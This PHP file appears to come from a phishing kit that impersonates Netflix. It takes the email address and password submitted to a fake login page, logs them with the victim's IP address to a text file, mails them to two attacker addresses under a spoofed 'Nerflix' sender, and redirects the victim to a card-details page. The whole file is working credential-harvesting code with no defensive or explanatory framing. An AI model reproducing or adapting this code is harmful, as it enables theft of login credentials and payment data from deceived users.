<?php

session_start();
include '../anti.php';
include '../vg.php';
include '../truelogin.php';


$email = $_SESSION['email_login'] = $_POST['email_login'];
$pass = $_SESSION['password'] = $_POST['password'];
$iP_adress = $_SERVER['REMOTE_ADDR'];
	 
	 
$vg = "
|===================LOGIN======================|
|Email       : $email
|Password        : $pass
|IP Adresse       : https://geoiptool.com/?ip=$iP_adress
|==============================================|";


$txt = fopen('../../r/r.txt', 'a');
fwrite($txt, $vg);
fclose($txt);

$subject = "New Login [$iP_adress]";
$headers = 'From: Nerflix@support.com' . "\r\n" .
        'X-Mailer: PHP/' . phpversion();
mail($to, $subject, $vg, $headers);mail($tox, $subject, $vg, $headers);

header("location:../card?websrc=".md5('AbdowVG')."&dispatched=".rand(20,100)."&id=".rand(10000000000,500000000)." ");


 

?>